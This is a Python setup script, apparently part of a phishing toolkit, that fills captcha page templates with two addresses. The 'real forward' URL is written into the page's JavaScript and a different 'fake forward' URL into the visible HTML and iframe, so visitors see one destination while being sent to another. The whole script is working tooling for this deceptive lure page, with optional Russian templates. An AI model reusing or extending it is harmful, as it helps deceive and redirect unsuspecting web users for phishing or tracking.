#!/usr/bin/env python3
import os
import utils
import re

R = '\033[31m' # red
G = '\033[32m' # green
C = '\033[36m' # cyan
W = '\033[0m'  # white

real_forward = os.getenv('REDIRECT')
fake_forward = os.getenv('DISPLAY_URL')
language = os.getenv('LANGUAGE')

if real_forward is None:
    real_forward = input(f'{G}[+] {C}Enter Real Forward URL :{W} ')
else:
    utils.print(f'{G}[+] {C}Real Forward URL :{W} '+real_forward)

if fake_forward is None:
    fake_forward = input(f'{G}[+] {C}Enter Fake Forward URL :{W} ')
else:
    utils.print(f'{G}[+] {C}Fake Forward URL :{W} '+fake_forward)

# Select template files based on language
index_temp_file = 'template/captcha/index_temp.html'
anchor_temp_file = 'template/captcha/anchor.html'

if language == 'russian':
    index_temp_file = 'template/captcha/index_temp_ru.html'
    anchor_temp_file = 'template/captcha/anchor_ru.html'

# Read from main_temp.js (template with REDIRECT_URL placeholder)
with open('template/captcha/js/main_temp.js', 'r', encoding='utf-8') as location_temp:
    js_file = location_temp.read()
    # Replace REDIRECT_URL with the actual URL
    updated_js_raw = js_file.replace('REDIRECT_URL', real_forward)

# Write the processed main.js file
with open('template/captcha/js/main.js', 'w', encoding='utf-8') as updated_js:
    updated_js.write(updated_js_raw)

# Assuming 'index_temp.html' is the template for the main HTML page
with open(index_temp_file, 'r', encoding='utf-8') as temp_index:
    temp_index_data = temp_index.read()
    # Replace FAKE_REDIRECT_URL with the fake URL displayed to the user
    updated_index_raw = temp_index_data.replace('FAKE_REDIRECT_URL', fake_forward)

# Write the processed index.html file
with open('template/captcha/index.html', 'w', encoding='utf-8') as updated_index:
    updated_index.write(updated_index_raw)

# Assuming 'anchor.html' is the template for the iframe content
with open(anchor_temp_file, 'r', encoding='utf-8') as temp_anchor:
    temp_anchor_data = temp_anchor.read()
    # Replace FAKE_REDIRECT_URL with the fake URL displayed to the user
    updated_anchor_raw = temp_anchor_data.replace('FAKE_REDIRECT_URL', fake_forward)

# Write the processed anchor.html file
with open('template/captcha/anchor.html', 'w', encoding='utf-8') as updated_anchor:
    updated_anchor.write(updated_anchor_raw)

utils.print(f'{G}[+] {C}Templates modified successfully!{W}')